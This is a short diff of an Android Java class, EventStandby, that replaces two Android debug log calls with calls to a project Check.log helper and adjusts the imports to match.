@@ -11,12 +11,11 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.Standby;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerStandby;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 public class EventStandby extends EventBase implements Observer<Standby> {
@@ -47,9 +46,9 @@ public class EventStandby extends EventBase implements Observer<Standby> {
 			actionOnEnter = event.getAction();
 			actionOnExit = databuffer.readInt();
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " exitAction: " + actionOnExit);
+			if(Cfg.DEBUG) Check.log( TAG + " exitAction: " + actionOnExit);
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 			return false;
 		}
 
